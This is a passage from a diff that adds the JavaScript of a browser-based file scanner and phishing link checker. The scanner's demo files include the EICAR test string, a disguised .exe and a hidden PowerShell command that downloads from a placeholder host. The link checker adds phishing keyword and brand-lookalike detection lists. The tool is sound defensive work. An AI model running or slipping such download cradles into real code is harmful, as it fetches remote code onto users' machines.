+      var rd=en.createReader(),batch;
+      do{
+        batch=await new Promise(function(res){rd.readEntries(res,function(){res([])})});
+        for(var j=0;j<batch.length;j++)await walk(batch[j],path+en.name+'/');
+      }while(batch.length&&out.length<2000);
+    }
+  }
+  for(var q=0;q<entries.length;q++)await walk(entries[q],'');
+  return out;
+}
+var hero=$('#hero');
+['dragenter','dragover'].forEach(function(t){hero.addEventListener(t,function(e){e.preventDefault();hero.classList.add('drag')})});
+hero.addEventListener('dragleave',function(e){if(e.target===hero)hero.classList.remove('drag')});
+hero.addEventListener('drop',function(e){e.preventDefault();hero.classList.remove('drag');collectDrop(e.dataTransfer).then(scanFiles)});
+$('#bFiles').addEventListener('click',function(){$('#fi').click()});
+$('#bFolder').addEventListener('click',function(){$('#fd').click()});
+['#fi','#fd'].forEach(function(s){$(s).addEventListener('change',function(e){var l=Array.prototype.slice.call(e.target.files);e.target.value='';scanFiles(l)})});
+function demoFiles(){
+  var sig=['X5O!P%@AP[4\\PZX54(P^)7CC)7}$','EICAR-STANDARD-ANTIVIRUS-TEST-FILE','!$H+H*'].join('');
+  var stub=function(){var u=new Uint8Array(4096),i;for(i=0;i<u.length;i++)u[i]=i%7;u.set([0x4d,0x5a,0x90,0,3,0,0,0],0);return u};
+  var png=new Uint8Array(2048);png.set([0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a],0);
+  var ps='powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AA== ; (New-Object Net.WebClient).DownloadString("http://example.invalid/a")';
+  var mk=function(parts,n){var f=new File(parts,n);f._demo=true;return f};
+  return [mk([sig],'eicar-test.com'),mk([stub()],'Invoice_2026.pdf.exe'),mk([stub()],'holiday-photo.jpg'),mk([ps],'update.ps1'),mk(['Agenda\n1. Budget\n2. Launch dates\n'],'meeting-notes.txt'),mk([png],'screenshot.png')];
+}
+$('#bDemo').addEventListener('click',function(){scanFiles(demoFiles())});
+updateHero();
+
+/* ============ LINK CHECKER ============ */
+var MULTI=new Set(['co.in','co.uk','com.au','gov.in','ac.in','org.in','net.in','nic.in','co.jp','com.br','co.za','com.sg','co.nz','org.uk','ac.uk','gov.uk','com.cn','com.mx','co.id','com.pk','com.bd','com.np','co.kr','github.io']);
+function regDomain(h){var p=h.split('.');if(p.length<=2)return h;var l2=p.slice(-2).join('.');return MULTI.has(l2)?p.slice(-3).join('.'):l2}
+var TRUSTED=new Set(['google.com','apple.com','microsoft.com','amazon.com','amazon.in','wikipedia.org','github.com','youtube.com','linkedin.com','mozilla.org','cloudflare.com','paypal.com','netflix.com','facebook.com','instagram.com','whatsapp.com','flipkart.com','anthropic.com','claude.ai','openai.com','irctc.co.in','uidai.gov.in','incometax.gov.in','google.co.in']);
+var SHORT=new Set(['bit.ly','tinyurl.com','t.co','goo.gl','is.gd','ow.ly','buff.ly','cutt.ly','rb.gy','shorturl.at','rebrand.ly','tiny.cc','lnkd.in']);
+var RISKY_TLD={tk:3,ml:3,ga:3,cf:3,gq:3,zip:3,mov:3,xyz:1,top:1,click:1,country:1,work:1,support:1,loan:1,review:1,icu:1,buzz:1,cyou:1,rest:1,monster:1,cam:1,men:1,party:1,link:1};
+var BRANDS=[
+  {n:'PayPal',k:'paypal',m:'sub',d:['paypal.com','paypal.me']},
+  {n:'Apple',k:'apple',m:'tok',d:['apple.com','icloud.com']},
+  {n:'Google',k:'google',m:'tok',d:['google.com','google.co.in','gmail.com','youtube.com','googleapis.com','gstatic.com','googleusercontent.com','goo.gl']},
+  {n:'Microsoft',k:'microsoft',m:'sub',d:['microsoft.com','live.com','office.com','outlook.com','microsoftonline.com','windows.com']},
+  {n:'Amazon',k:'amazon',m:'sub',d:['amazon.com','amazon.in','amazon.co.uk','amazon.de','amazonaws.com']},
+  {n:'Netflix',k:'netflix',m:'sub',d:['netflix.com']},
+  {n:'Facebook',k:'facebook',m:'sub',d:['facebook.com','fb.com']},
+  {n:'Instagram',k:'instagram',m:'sub',d:['instagram.com']},
+  {n:'WhatsApp',k:'whatsapp',m:'sub',d:['whatsapp.com','whatsapp.net','wa.me']},
+  {n:'Paytm',k:'paytm',m:'sub',d:['paytm.com']},
+  {n:'PhonePe',k:'phonepe',m:'sub',d:['phonepe.com']},
+  {n:'Flipkart',k:'flipkart',m:'sub',d:['flipkart.com']},
+  {n:'IRCTC',k:'irctc',m:'sub',d:['irctc.co.in']},
+  {n:'HDFC Bank',k:'hdfc',m:'sub',d:['hdfcbank.com','hdfc.com']},
+  {n:'ICICI Bank',k:'icici',m:'sub',d:['icicibank.com']},
+  {n:'SBI',k:'sbi',m:'tok',d:['onlinesbi.sbi','sbi.co.in','onlinesbi.com']}
+];
+var SUBS=[['0','o'],['1','l'],['3','e'],['5','s'],['rn','m'],['vv','w']];
+var KW=['login','signin','sign-in','verify','verification','secure','security','account','update','confirm','banking','password','wallet','otp','kyc','claim','prize','winner','lottery','giftcard','gift','free','recharge','refund','suspended','unlock','bonus','reward'];
+var DLEXT=/\.(exe|apk|msi|scr|bat|cmd|vbs|ps1|jar|dmg|pkg|lnk|hta)(?:$|[?#])/i;
+function brandHit(host,reg){
+  var tokens=host.split(/[.\-]/),first=reg.split('.')[0];
+  var norm=SUBS.reduce(function(s,p){return s.split(p[0]).join(p[1])},first);
+  for(var i=0;i<BRANDS.length;i++){
+    var b=BRANDS[i];if(b.d.indexOf(reg)>-1)continue;
+    var hit=b.m==='sub'?host.indexOf(b.k)>-1:tokens.indexOf(b.k)>-1;
+    var look=norm!==first&&(b.m==='sub'?norm.indexOf(b.k)>-1:norm===b.k);
+    if(hit||look)return {b:b,look:!hit};
+  }
+  return null;
+}
+function analyzeURL(input){
+  var raw=input.trim(),f=[],score=0;
+  var add=function(lv,t,d,p){f.push({lv:lv,t:t,d:d});score+=p};
+  var res=function(level,host,rest){return {raw:raw,level:level,host:host,rest:rest||'',findings:f}};
+  if(/^(javascript|data|vbscript|file|blob):/i.test(raw)){add('high','Not a web address','This link runs code or opens local data instead of loading a website.',9);return res('bad',raw.slice(0,60))}
+  if(/^(mailto|tel|sms):/i.test(raw)){add('info','Not a web link','Email, phone and SMS links are not checked here.',0);return res('invalid',raw)}
+  var s=raw,assumed=false;
+  if(!/^[a-z][a-z0-9+.\-]*:\/\//i.test(s)){s='https://'+s;assumed=true}
+  var u;
+  try{u=new URL(s)}catch(e){add('info','Not a valid link','Check for typos or missing parts.',0);return res('invalid',raw)}
+  var host=u.hostname.toLowerCase().replace(/\.$/,'');
+  var isIp=/^\d{1,3}(\.\d{1,3}){3}$/.test(host)||host.charAt(0)==='[';
+  if(!isIp&&host.indexOf('.')<0){add('info','Not a valid link','The address has no domain name.',0);return res('invalid',raw)}
+  if(u.protocol!=='http:'&&u.protocol!=='https:'){add('high','Unusual link type','Only http and https links open normal websites.',9);return res('bad',host)}
+  var reg=isIp?host:regDomain(host);
+  var path=u.pathname+u.search,hay;
+  try{hay=decodeURIComponent(host+path).toLowerCase()}catch(e){hay=(host+path).toLowerCase()}
+
+  if(u.username||u.password)add('high','Hidden destination (@ trick)','Everything before the @ is ignored by the browser. This link really goes to '+host+'.',6);
+  if(isIp)add('med','Uses a numeric address','Real services use names. Numeric addresses are common in scams and malware hosting.',3);
+  if(/(^|\.)xn--/.test(host))add('med','Look-alike characters in the domain','Foreign letters can imitate familiar ones, such as a Cyrillic a for a Latin a.',3);
+  if(!isIp){
+    var bh=brandHit(host,reg);
+    if(bh)add('high',bh.look?'Look-alike of '+bh.b.n:'Pretends to be '+bh.b.n,'The real '+bh.b.n+' sites end in '+bh.b.d.slice(0,3).join(', ')+'. This one is on '+reg+'.',6);
+    var tld=host.split('.').pop();
+    if(RISKY_TLD[tld])add(RISKY_TLD[tld]>1?'med':'low','Risky domain ending (.'+tld+')','This ending is cheap or free, so it is heavily used for throwaway scam sites.',RISKY_TLD[tld]);
+    if(SHORT.has(reg))add('med','Shortened link','The real destination is hidden. Do not open it unless you trust whoever sent it.',3);
+    var subs=host.split('.').length-reg.split('.').length;
+    if(subs>3)add('med','Too many subdomains','Long chains of names are used to bury the real domain.',3);
+    if((host.match(/-/g)||[]).length>=3)add('low','Many hyphens in the domain','Scam domains often stack words with hyphens.',1);
+  }
+  if(u.protocol==='http:')add('low','Not encrypted (http)','Anything you type can be read on the way. Real login pages use https.',2);
+  if(u.port&&u.port!=='80'&&u.port!=='443')add('low','Unusual port :'+u.port,'Normal websites rarely use custom ports.',1);
+  var hits=KW.filter(function(w){return hay.indexOf(w)>-1});
+  if(hits.length)add(hits.length>=3?'med':'low','Urgent or credential words: '+hits.slice(0,4).join(', '),'Phishing pages lean on words like these to push you to act.',Math.min(hits.length,3));
+  if(DLEXT.test(u.pathname)||DLEXT.test(u.search))add('med','Direct download of a program','Installing apps or programs from a random link can infect your device.',3);
+  if(/[?&](?:url|redirect|redirect_uri|next|goto|link|target)=https?(?::|%3a)/i.test(u.search))add('low','Redirects to another site','The link forwards you elsewhere after you open it.',1);
+  if(s.length>150)add('low','Very long address','Long addresses can hide where they lead.',1);
+  var trusted=TRUSTED.has(reg)&&!u.username;
+  if(trusted)add('info','Well-known website','The domain is '+reg+'.',0);
+  if(assumed)add('info','No https:// given','Checked as if it started with https://.',0);
+  var hasHigh=f.some(function(x){return x.lv==='high'});
+  var level=(hasHigh||score>=7)?'bad':score>=3?'warn':'ok';
+  var rest=(u.pathname==='/'&&!u.search?'':u.pathname+u.search).slice(0,90);
+  return res(level,host,rest);
+}
+var EXAMPLES=['https://www.apple.com/support','http://paypal-secure-login.verify-account.xyz/update?otp=1','https://bit.ly/3abcXyZ','http://192.168.4.20:8080/free-recharge.apk'];
+var L={mine:[],ex:EXAMPLES.slice()};
+try{var st=JSON.parse(localStorage.getItem('clearscan.links')||'[]');if(Array.isArray(st))L.mine=st.filter(function(x){return typeof x==='string'}).slice(0,100)}catch(e){}
+function saveLinks(){try{localStorage.setItem('clearscan.links',JSON.stringify(L.mine))}catch(e){}}
+var LP={bad:['Dangerous','lv-bad'],warn:['Caution','lv-warn'],ok:['No red flags','lv-ok'],invalid:['Invalid','lv-mute']};
+function linkRow(raw,isEx){
+  var a=analyzeURL(raw),p=LP[a.level],k='l:'+raw;
+  var vt='https://www.virustotal.com/gui/search/'+encodeURIComponent(raw);
+  var sb='https://transparencyreport.google.com/safe-browsing/search?url='+encodeURIComponent(raw);
+  var finds='<ul class="finds">'+a.findings.map(function(x){return '<li class="'+x.lv+'"><i></i><div><b>'+esc(x.t)+'</b><span>'+esc(x.d)+'</span></div></li>'}).join('')+'</ul>';
+  var verdict=a.level==='bad'?'Do not open this link or enter any details on it.':a.level==='warn'?'Open only if you know who sent it and expected it.':a.level==='ok'?'No warning signs in the address itself.':'';
+  return '<li><details data-k="'+esc(k)+'"'+(openSet.has(k)?' open':'')+'><summary><span class="ico '+p[1]+'">'+svg(IC.link)+'</span><span class="nm"><b>'+esc(a.host)+'</b><small>'+(isEx?'<em>Example</em> · ':'')+esc(a.rest||'')+'</small></span><span class="pill '+p[1]+'">'+p[0]+'</span>'+svg(IC.chev,'chev')+'</summary><div class="body">'+(verdict?'<p style="margin:0;font-weight:600">'+verdict+'</p>':'')+finds+'<div class="hash">'+esc(raw)+'</div><div class="row-actions">'+(a.level!=='invalid'?'<a class="btn sec sm" href="'+esc(vt)+'" target="_blank" rel="noopener noreferrer">VirusTotal</a><a class="btn sec sm" href="'+esc(sb)+'" target="_blank" rel="noopener noreferrer">Safe Browsing</a>':'')+'<button class="btn sec sm" data-act="cp" data-raw="'+esc(raw)+'">Copy link</button><button class="btn sec sm" data-act="rm" data-raw="'+esc(raw)+'" data-ex="'+(isEx?1:0)+'">Remove</button></div></div></details></li>';
+}
+function renderLinks(){
+  var all=L.mine.map(function(r){return {r:r,ex:false}}).concat(L.ex.map(function(r){return {r:r,ex:true}}));
+  var bad=0,warn=0;
+  var html=all.map(function(x){var a=analyzeURL(x.r);if(a.level==='bad')bad++;else if(a.level==='warn')warn++;return linkRow(x.r,x.ex)}).join('');
+  $('#lkList').innerHTML=html||'<li class="empty">No links yet. Paste one above to check it.</li>';
+  var sum=$('#lkSum');
+  sum.className='chip'+(bad?' bad':warn?' warn':all.length?' ok':'');
+  sum.textContent=!all.length?'0 links':bad?bad+' dangerous':warn?warn+' to review':all.length+' look fine';
+  $('#bExamples').hidden=!L.ex.length;
+  $('#bClearLinks').hidden=!L.mine.length;
+}
+$('#addForm').addEventListener('submit',function(e){
+  e.preventDefault();
+  var parts=$('#lkIn').value.split(/[\s,]+/).filter(Boolean),added=[];
+  parts.forEach(function(p){if(L.mine.indexOf(p)<0&&L.ex.indexOf(p)<0){L.mine.unshift(p);added.push(p)}});
+  if(!parts.length){toast('Paste a link first');return}
+  if(!added.length){toast('Already in your list');return}
+  L.mine=L.mine.slice(0,100);saveLinks();
+  openSet.add('l:'+added[added.length-1]);
+  $('#lkIn').value='';renderLinks();
+  toast(added.length===1?'Link checked':added.length+' links checked');
+});
+$('#lkList').addEventListener('click',function(e){
+  var b=e.target.closest('[data-act]');if(!b)return;
+  var raw=b.dataset.raw;
+  if(b.dataset.act==='cp')copy(raw);
+  else{if(b.dataset.ex==='1')L.ex=L.ex.filter(function(x){return x!==raw});else{L.mine=L.mine.filter(function(x){return x!==raw});saveLinks()}renderLinks()}
+});
+$('#bExamples').addEventListener('click',function(){L.ex=[];renderLinks()});
+$('#bClearLinks').addEventListener('click',function(){L.mine=[];saveLinks();renderLinks()});
+renderLinks();
+})();
+</script>
+
+</body></html>
